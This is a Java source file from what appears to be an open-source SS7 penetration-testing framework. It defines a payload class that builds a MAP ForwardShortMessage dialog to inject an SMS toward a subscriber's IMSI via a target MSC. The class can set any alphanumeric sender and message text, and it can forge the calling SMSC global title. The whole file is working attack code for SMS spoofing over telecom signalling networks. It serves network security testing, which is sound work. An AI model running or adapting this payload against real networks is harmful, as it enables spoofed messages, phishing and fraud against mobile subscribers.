/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.connectivity.ss7.payloadwrapper.sms;

import com.rodan.connectivity.ss7.adapter.MapAdapter;
import com.rodan.connectivity.ss7.adapter.SccpAdapter;
import com.rodan.connectivity.ss7.payloadwrapper.JSs7PayloadWrapper;
import com.rodan.connectivity.ss7.service.MapDialogGenerator;
import com.rodan.connectivity.ss7.service.MapSmsService;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Payload;
import com.rodan.library.model.config.node.config.IntruderNodeConfig;
import com.rodan.library.model.config.node.config.NodeConfig;
import com.rodan.library.model.error.ErrorCode;
import com.rodan.library.model.error.SystemException;
import lombok.AccessLevel;
import lombok.Builder;
import lombok.Getter;
import org.apache.commons.lang3.StringUtils;
import org.mobicents.protocols.ss7.indicator.RoutingIndicator;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContext;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextName;
import org.mobicents.protocols.ss7.map.api.MAPException;
import org.mobicents.protocols.ss7.map.api.primitives.AddressNature;
import org.mobicents.protocols.ss7.map.api.primitives.NumberingPlan;
import org.mobicents.protocols.ss7.map.api.service.sms.MAPDialogSms;
import org.mobicents.protocols.ss7.map.api.smstpdu.NumberingPlanIdentification;
import org.mobicents.protocols.ss7.map.api.smstpdu.TypeOfNumber;

import java.time.LocalDateTime;

@Payload(name = Constants.FSM_PAYLOAD_NAME)
public class FsmPayloadWrapper extends JSs7PayloadWrapper<MapSmsService, MAPDialogSms> {
    @Getter(AccessLevel.PRIVATE) private String imsi;
    @Getter(AccessLevel.PRIVATE) private String sender;
    @Getter(AccessLevel.PRIVATE) private String targetMscGt;
    @Getter(AccessLevel.PRIVATE) private String content;
    @Getter(AccessLevel.PRIVATE) private String spoofSmsc;
    @Getter(AccessLevel.PRIVATE) private String smscGt;
    @Getter(AccessLevel.PRIVATE) private String mapVersion;

    @Builder
    public FsmPayloadWrapper(String localGt, int localSsn, int remoteSsn, NodeConfig nodeConfig, SccpAdapter sccpAdapter, 
                             MapAdapter mapAdapter, MapDialogGenerator<MAPDialogSms> dialogGenerator, String imsi, 
                             String sender, String targetMscGt, String content, String spoofSmsc, String smscGt, 
                             String mapVersion) {
        super(localGt, localSsn, remoteSsn, nodeConfig, sccpAdapter, mapAdapter, dialogGenerator);
        this.imsi = imsi;
        this.sender = sender;
        this.targetMscGt = targetMscGt;
        this.content = content;
        this.spoofSmsc = spoofSmsc;
        this.smscGt = smscGt;
        this.mapVersion = mapVersion;
    }

    @Override
    public MAPDialogSms generateCarrier() throws SystemException {
        validate();

        var sccpFactory = getSccpAdapter().getParamFactory();
        var spoofSmsc = "Yes".equalsIgnoreCase(getSpoofSmsc());
        var callingStr = spoofSmsc ? getSmscGt() : getLocalGt();
        var callingGt = sccpFactory.createGlobalTitle(callingStr,
                TRANSLATION_TYPE, ISDN_TELEPHONY_INDICATOR, ENCODING_SCHEME, NATURE_OF_ADDRESS);
        var callingPc = Integer.valueOf(getNodeConfig().getSs7Association().getLocalNode().getPointCode());
        var callingParty = sccpFactory.createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, callingGt,
                        callingPc, getLocalSsn());
        var calledGt = sccpFactory.createGlobalTitle(getTargetMscGt(),
                TRANSLATION_TYPE, ISDN_TELEPHONY_INDICATOR, ENCODING_SCHEME, NATURE_OF_ADDRESS);
        var calledPc = Integer.valueOf(((IntruderNodeConfig) getNodeConfig()).getSs7Association().getPeerNode().getPointCode());
        var calledParty = sccpFactory.createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, calledGt,
                        calledPc, getRemoteSsn());

        return dialogGenerator.generate(callingParty, calledParty, getApplicationContext());
    }

    @Override
    public void addToCarrier(MAPDialogSms dialog) throws SystemException {
        try {
            validate();

            var paramFactory = getMapAdapter().getParamFactory();
            var smsParamFactory = getMapAdapter().getSmsParamFactory();

            var imsi = paramFactory.createIMSI(getImsi());
            var da = paramFactory.createSM_RP_DA(imsi);
            var smscSrt = StringUtils.isBlank(getSmscGt()) ? getLocalGt() : getSmscGt();
            var smsc = paramFactory.createAddressString(AddressNature.international_number, NumberingPlan.ISDN, smscSrt);
            var oa = paramFactory.createSM_RP_OA_ServiceCentreAddressOA(smsc);
            var senderStr = getSender().replace("_", " ");
            var sender = smsParamFactory.createAddressField(TypeOfNumber.Alphanumeric,
                    NumberingPlanIdentification.Unknown, senderStr);
            var protocolId = smsParamFactory.createProtocolIdentifier(0); // TP-Protocol-Identifier
            var currentTime = LocalDateTime.now();
            int cairoTimeZone = 2; // TODO make it a configuration
            var timestamp = smsParamFactory.createAbsoluteTimeStamp(currentTime.getYear(), currentTime.getMonthValue(),
                    currentTime.getDayOfMonth(), currentTime.getHour(), currentTime.getMinute(), currentTime.getSecond(),
                    cairoTimeZone);
            var coding = smsParamFactory.createDataCodingScheme(0); // TODO IMP TRX: check value
            var contentStr = getContent().replace("_", " ");
            var userData = smsParamFactory.createUserData(contentStr, coding, null, null);
            var smst = smsParamFactory.createSmsDeliverTpdu(false, false, false,
                    true, sender, protocolId, timestamp, userData);
            var signalingInfo = paramFactory.createSmsSignalInfo(smst, null);
            dialog.addForwardShortMessageRequest(da, oa, signalingInfo, false);

        } catch (MAPException e) {
            logger.error("Failed to add ForwardSM to dialog", e);
            throw SystemException.builder().code(ErrorCode.MAP_INITIALIZATION).build();
        }
    }

    @Override
    protected MAPApplicationContext getApplicationContext() throws SystemException {
        Integer[] supportedVersions = {1, 2};
        var mapContextVersion = getAcVersion(Integer.parseInt(getMapVersion()), supportedVersions);
        return MAPApplicationContext.getInstance(MAPApplicationContextName.shortMsgMTRelayContext, mapContextVersion);
    }
}
